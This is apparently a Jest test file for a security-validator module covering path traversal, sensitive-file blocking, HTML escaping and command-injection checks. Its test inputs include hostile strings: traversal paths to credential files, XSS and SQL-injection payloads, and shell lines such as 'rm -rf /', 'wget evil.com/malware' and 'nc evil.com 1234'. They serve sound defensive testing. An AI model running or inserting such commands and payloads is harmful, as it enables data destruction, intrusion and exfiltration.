const SecurityValidators = require('../../nodes/lib/validators/security-validators');
const ErrorHandler = require('../../nodes/lib/error-handler');

describe('SecurityValidators', () => {
  describe('validateFilePath', () => {
    describe('Path Traversal Protection', () => {
      it('should block ../ directory traversal attempts', () => {
        const dangerousPaths = [
          '../etc/passwd',
          '../../etc/shadow',
          '../../../root/.ssh/id_rsa',
          'images/../../../etc/passwd',
          './../../passwords.txt',
          'data/../../config.json'
        ];

        dangerousPaths.forEach(path => {
          expect(() => {
            SecurityValidators.validateFilePath(path);
          }).toThrow(/Path traversal attempt detected/);
        });
      });

      it('should block ..\\ Windows directory traversal attempts', () => {
        const dangerousPaths = [
          '..\\windows\\system32',
          '..\\..\\windows\\system.ini',
          'images\\..\\..\\..\\windows\\win.ini',
          '.\\..\\..\\passwords.txt'
        ];

        dangerousPaths.forEach(path => {
          expect(() => {
            SecurityValidators.validateFilePath(path);
          }).toThrow(/Path traversal attempt detected/);
        });
      });

      it('should block mixed separator traversal attempts', () => {
        const dangerousPaths = [
          '../..\\etc/passwd',
          '..\\../windows/system32',
          'data/../..\\config.json'
        ];

        dangerousPaths.forEach(path => {
          expect(() => {
            SecurityValidators.validateFilePath(path);
          }).toThrow(/Path traversal attempt detected/);
        });
      });

      it('should block URL-encoded traversal attempts', () => {
        const dangerousPaths = [
          '%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64',  // ../etc/passwd encoded
          '%2e%2e%2fconfig',                           // ../config
          'files%2f%2e%2e%2f%2e%2e%2fpasswords'       // files/../../passwords
        ];

        dangerousPaths.forEach(path => {
          expect(() => {
            SecurityValidators.validateFilePath(path);
          }).toThrow(/encoded path traversal attempt detected/);
        });
      });

      it('should block double-encoded traversal attempts', () => {
        const dangerousPaths = [
          'files%252f%252e%252e%252fetc',  // Double encoded files/../etc
          'data%255c%252e%252e%255cwindows'   // Double encoded data\..\windows
        ];

        dangerousPaths.forEach(path => {
          expect(() => {
            SecurityValidators.validateFilePath(path);
          }).toThrow(/Double-encoded path traversal attempt detected/);
        });
      });
    });

    describe('Absolute Path Protection', () => {
      it('should block Unix absolute paths by default', () => {
        const absolutePaths = [
          '/etc/passwd',
          '/root/.ssh/id_rsa',
          '/var/www/html/config.php',
          '/home/user/secrets.txt'
        ];

        absolutePaths.forEach(path => {
          expect(() => {
            SecurityValidators.validateFilePath(path);
          }).toThrow(/Absolute paths are not allowed/);
        });
      });

      it('should block Windows absolute paths by default', () => {
        const absolutePaths = [
          'C:\\Windows\\System32\\config\\SAM',
          'D:\\passwords.txt',
          'E:\\Users\\Admin\\Desktop\\secrets.docx',
          'c:/windows/system.ini'
        ];

        absolutePaths.forEach(path => {
          expect(() => {
            SecurityValidators.validateFilePath(path);
          }).toThrow(/Absolute paths are not allowed/);
        });
      });

      it('should block UNC paths', () => {
        const uncPaths = [
          '\\\\server\\share\\file.txt',
          '\\\\192.168.1.1\\admin$\\passwords.txt',
          '\\\\localhost\\c$\\windows\\system32'
        ];

        uncPaths.forEach(path => {
          expect(() => {
            SecurityValidators.validateFilePath(path);
          }).toThrow(/(UNC paths are not allowed|Absolute paths are not allowed)/);
        });
      });

      it('should allow absolute paths when explicitly permitted', () => {
        const absolutePaths = [
          '/var/log/app.log',
          'C:\\Logs\\application.log'
        ];

        absolutePaths.forEach(path => {
          expect(() => {
            const result = SecurityValidators.validateFilePath(path, { allowAbsolute: true });
            expect(result).toBeTruthy();
          }).not.toThrow();
        });
      });
    });

    describe('Dangerous Pattern Protection', () => {
      it('should block null bytes in paths', () => {
        const nullBytePaths = [
          'file.txt\0.jpg',
          'document\0/../../etc/passwd',
          'image.png\0'
        ];

        nullBytePaths.forEach(path => {
          expect(() => {
            SecurityValidators.validateFilePath(path);
          }).toThrow(/null bytes/);
        });
      });

      it('should block control characters', () => {
        const controlCharPaths = [
          'file\x01.txt',    // SOH character  
          'doc\x07.pdf',     // bell character
          '\x7fhidden.txt'   // DEL character
        ];

        controlCharPaths.forEach(path => {
          expect(() => {
            SecurityValidators.validateFilePath(path);
          }).toThrow(/control characters/);
        });
      });

      it('should block sensitive file patterns', () => {
        const sensitiveFiles = [
          '.htaccess',
          '.htpasswd',
          'web.config',
          '.env',
          '.env.local',
          '.git/config',
          '.svn/entries',
          'config.php.bak',
          'database.sql~',
          'passwords.txt.swp'
        ];

        sensitiveFiles.forEach(path => {
          expect(() => {
            SecurityValidators.validateFilePath(path);
          }).toThrow(/blocked pattern/);
        });
      });

      it('should block Windows device names', () => {
        // Only test on Windows
        if (process.platform === 'win32') {
          const deviceNames = [
            'CON',
            'PRN',
            'AUX',
            'NUL',
            'COM1',
            'LPT1',
            'con.txt',
            'prn.pdf',
            'aux.docx'
          ];

          deviceNames.forEach(path => {
            expect(() => {
              SecurityValidators.validateFilePath(path);
            }).toThrow(/device names are not allowed/);
          });
        }
      });

      it('should block alternate data streams on Windows', () => {
        // Only test on Windows
        if (process.platform === 'win32') {
          const adssPaths = [
            'file.txt:hidden',
            'document.pdf:stream',
            'image.jpg:$DATA'
          ];

          adssPaths.forEach(path => {
            expect(() => {
              SecurityValidators.validateFilePath(path);
            }).toThrow(/Alternate data streams are not allowed/);
          });
        }
      });
    });

    describe('Valid Path Handling', () => {
      it('should allow safe relative paths', () => {
        const safePaths = [
          'file.txt',
          'images/photo.jpg',
          'data/users/profile.json',
          './current/file.txt',
          'subfolder/document.pdf'
        ];

        safePaths.forEach(path => {
          expect(() => {
            const result = SecurityValidators.validateFilePath(path);
            expect(result).toBeTruthy();
            // Should return normalized path
            expect(typeof result).toBe('string');
          }).not.toThrow();
        });
      });

      it('should normalize valid paths', () => {
        const pathTests = [
          { input: './file.txt', expected: 'file.txt' },
          { input: 'folder/./file.txt', expected: 'folder/file.txt' },
          { input: 'folder//file.txt', expected: 'folder/file.txt' }
        ];

        pathTests.forEach(test => {
          const result = SecurityValidators.validateFilePath(test.input);
          // Normalize comparison for cross-platform
          expect(result.replace(/\\/g, '/')).toBe(test.expected.replace(/\\/g, '/'));
        });
      });

      it('should enforce file extension restrictions when specified', () => {
        const options = {
          allowedExtensions: ['.jpg', '.png', '.gif']
        };

        // Should allow specified extensions
        expect(() => {
          SecurityValidators.validateFilePath('image.jpg', options);
          SecurityValidators.validateFilePath('photo.png', options);
          SecurityValidators.validateFilePath('animation.gif', options);
        }).not.toThrow();

        // Should block other extensions
        expect(() => {
          SecurityValidators.validateFilePath('document.pdf', options);
        }).toThrow(/File extension not allowed/);

        expect(() => {
          SecurityValidators.validateFilePath('script.exe', options);
        }).toThrow(/File extension not allowed/);
      });

      it('should handle custom blocked patterns', () => {
        const options = {
          blockedPatterns: [/^temp/, /test\.txt$/]
        };

        expect(() => {
          SecurityValidators.validateFilePath('temp_file.txt', options);
        }).toThrow(/blocked pattern/);

        expect(() => {
          SecurityValidators.validateFilePath('unittest.txt', options);
        }).toThrow(/blocked pattern/);

        expect(() => {
          SecurityValidators.validateFilePath('regular_file.txt', options);
        }).not.toThrow();
      });
    });

    describe('Path Length Validation', () => {
      it('should reject paths longer than 255 characters', () => {
        const longPath = 'a'.repeat(256) + '.txt';
        
        expect(() => {
          SecurityValidators.validateFilePath(longPath);
        }).toThrow(/exceeds maximum length/);
      });

      it('should allow paths up to 255 characters', () => {
        const maxPath = 'a'.repeat(251) + '.txt';  // 251 + 4 = 255
        
        expect(() => {
          const result = SecurityValidators.validateFilePath(maxPath);
          expect(result).toBeTruthy();
        }).not.toThrow();
      });
    });

    describe('Error Types', () => {
      it('should throw security errors for security violations', () => {
        try {
          SecurityValidators.validateFilePath('../etc/passwd');
          fail('Should have thrown an error');
        } catch (error) {
          expect(error.type).toBe('security');
          expect(error.category).toBe('security');
          expect(error.severity).toBe('critical');
          expect(error.message).toMatch(/Security violation/);
        }
      });

      it('should throw validation errors for invalid input', () => {
        try {
          SecurityValidators.validateFilePath(null);
          fail('Should have thrown an error');
        } catch (error) {
          expect(error.message).toMatch(/must be a non-empty string/);
        }
      });
    });
  });

  describe('validateFileGroup', () => {
    describe('Valid Groups', () => {
      it('should allow alphanumeric group names', () => {
        const validGroups = [
          'userfiles',
          'products',
          'images2023',
          'user-files',
          'user_files',
          'Product-Images_2023'
        ];

        validGroups.forEach(group => {
          expect(() => {
            const result = SecurityValidators.validateFileGroup(group);
            expect(result).toBeTruthy();
            expect(typeof result).toBe('string');
          }).not.toThrow();
        });
      });

      it('should trim whitespace from group names', () => {
        const result = SecurityValidators.validateFileGroup('  products  ');
        expect(result).toBe('products');
      });
    });

    describe('Invalid Groups', () => {
      it('should reject empty or whitespace-only groups', () => {
        // Test empty string
        expect(() => {
          SecurityValidators.validateFileGroup('');
        }).toThrow(/must be a non-empty string/);
        
        // Test whitespace-only strings
        const whitespaceGroups = ['   ', '\t', '\n'];
        whitespaceGroups.forEach(group => {
          expect(() => {
            SecurityValidators.validateFileGroup(group);
          }).toThrow(/cannot be empty/);
        });
      });

      it('should reject groups with path separators', () => {
        const invalidGroups = [
          'user/files',
          'user\\files',
          '/userfiles',
          'userfiles/',
          '../products'
        ];

        invalidGroups.forEach(group => {
          expect(() => {
            SecurityValidators.validateFileGroup(group);
          }).toThrow(/cannot contain path separators/);
        });
      });

      it('should reject groups with traversal patterns', () => {
        const invalidGroups = [
          '..',
          '.',
          'user..files',
          '..products'
        ];

        invalidGroups.forEach(group => {
          expect(() => {
            SecurityValidators.validateFileGroup(group);
          }).toThrow(/cannot contain traversal patterns/);
        });
      });

      it('should reject groups with control characters', () => {
        const invalidGroups = [
          'user\0files',
          'products\x1f',
          '\x7fhidden'
        ];

        invalidGroups.forEach(group => {
          expect(() => {
            SecurityValidators.validateFileGroup(group);
          }).toThrow(/control characters/);
        });
      });

      it('should reject groups with special characters', () => {
        const invalidGroups = [
          'user files',  // space
          'user@files',
          'user#files',
          'user$files',
          'user%files',
          'user&files',
          'user*files',
          'user(files)',
          'user[files]',
          'user{files}',
          'user|files',
          'user;files',
          'user:files',
          'user<files>',
          'user?files',
          'user"files',
          "user'files"
        ];

        invalidGroups.forEach(group => {
          expect(() => {
            SecurityValidators.validateFileGroup(group);
          }).toThrow(/must contain only alphanumeric characters, underscores, and hyphens/);
        });
      });
    });

    describe('Type Validation', () => {
      it('should reject non-string inputs', () => {
        const invalidInputs = [
          null,
          undefined,
          123,
          {},
          [],
          true,
          () => {}
        ];

        invalidInputs.forEach(input => {
          expect(() => {
            SecurityValidators.validateFileGroup(input);
          }).toThrow(/must be a non-empty string/);
        });
      });
    });
  });

  describe('sanitizeInput', () => {
    describe('XSS Protection', () => {
      it('should escape HTML special characters by default', () => {
        const tests = [
          { input: '<script>alert("XSS")</script>', expected: '&lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;' },
          { input: '<img src=x onerror="alert(1)">', expected: '&lt;img src=x onerror=&quot;alert(1)&quot;&gt;' },
          { input: "'; DROP TABLE users; --", expected: "&#x27;; DROP TABLE users; --" },
          { input: '&<>"\'/', expected: '&amp;&lt;&gt;&quot;&#x27;&#x2F;' }
        ];

        tests.forEach(test => {
          const result = SecurityValidators.sanitizeInput(test.input);
          expect(result).toBe(test.expected);
        });
      });

      it('should not double-escape ampersands', () => {
        const input = '&amp;&lt;&gt;';
        const result = SecurityValidators.sanitizeInput(input);
        expect(result).toBe('&amp;&lt;&gt;');
      });

      it('should remove null bytes', () => {
        const input = 'hello\0world';
        const result = SecurityValidators.sanitizeInput(input);
        expect(result).toBe('helloworld');
      });

      it('should remove non-printable characters', () => {
        const input = 'hello\x00\x01\x02world\x1f';
        const result = SecurityValidators.sanitizeInput(input);
        expect(result).toBe('helloworld');
      });

      it('should preserve newlines and tabs', () => {
        const input = 'hello\nworld\ttab';
        const result = SecurityValidators.sanitizeInput(input);
        expect(result).toBe('hello\nworld\ttab');
      });
    });

    describe('Length Limiting', () => {
      it('should truncate input exceeding max length', () => {
        const longInput = 'a'.repeat(2000);
        const result = SecurityValidators.sanitizeInput(longInput);
        expect(result.length).toBe(1000); // default max length
      });

      it('should respect custom max length', () => {
        const input = 'a'.repeat(100);
        const result = SecurityValidators.sanitizeInput(input, { maxLength: 50 });
        expect(result.length).toBe(50);
      });
    });

    describe('Type Handling', () => {
      it('should return empty string for non-string inputs', () => {
        const inputs = [null, undefined, 123, {}, [], true];
        
        inputs.forEach(input => {
          const result = SecurityValidators.sanitizeInput(input);
          expect(result).toBe('');
        });
      });
    });
  });

  describe('validateCommand', () => {
    describe('Command Injection Protection', () => {
      it('should block shell metacharacters', () => {
        const dangerousCommands = [
          'ls; rm -rf /',
          'cat file.txt && wget evil.com/malware',
          'echo hello | nc evil.com 1234',
          'ls `whoami`',
          'ls $(whoami)',
          'ls {file1,file2}',
          'ls [abc]',
          'ls > /etc/passwd',
          'ls < /etc/shadow'
        ];

        dangerousCommands.forEach(cmd => {
          expect(() => {
            SecurityValidators.validateCommand(cmd);
          }).toThrow(/dangerous characters/);
        });
      });

      it('should block newlines and carriage returns', () => {
        const commands = [
          'ls\nrm -rf /',
          'ls\rrm -rf /',
          'ls\n\rmalicious'
        ];

        commands.forEach(cmd => {
          expect(() => {
            SecurityValidators.validateCommand(cmd);
          }).toThrow(/dangerous characters/);
        });
      });

      it('should block null bytes', () => {
        expect(() => {
          SecurityValidators.validateCommand('ls\0malicious');
        }).toThrow(/dangerous characters/);
      });
    });

    describe('Allowed Commands', () => {
      it('should validate against allowed command list', () => {
        const allowedCommands = ['list', 'get', 'update', 'delete'];

        // Should allow listed commands
        allowedCommands.forEach(cmd => {
          expect(() => {
            const result = SecurityValidators.validateCommand(cmd, allowedCommands);
            expect(result).toBe(cmd);
          }).not.toThrow();
        });

        // Should block unlisted commands
        expect(() => {
          SecurityValidators.validateCommand('execute', allowedCommands);
        }).toThrow(/not in allowed list/);
      });

      it('should allow safe commands without restrictions', () => {
        const safeCommands = [
          'list',
          'get-products',
          'update_inventory',
          'DELETE_ITEM'
        ];

        safeCommands.forEach(cmd => {
          expect(() => {
            const result = SecurityValidators.validateCommand(cmd);
            expect(result).toBe(cmd);
          }).not.toThrow();
        });
      });
    });

    describe('Type Validation', () => {
      it('should reject non-string inputs', () => {
        const invalidInputs = [null, undefined, 123, {}, [], true];
        
        invalidInputs.forEach(input => {
          expect(() => {
            SecurityValidators.validateCommand(input);
          }).toThrow(/must be a non-empty string/);
        });
      });

      it('should reject empty strings', () => {
        expect(() => {
          SecurityValidators.validateCommand('');
        }).toThrow(/must be a non-empty string/);
      });
    });
  });
});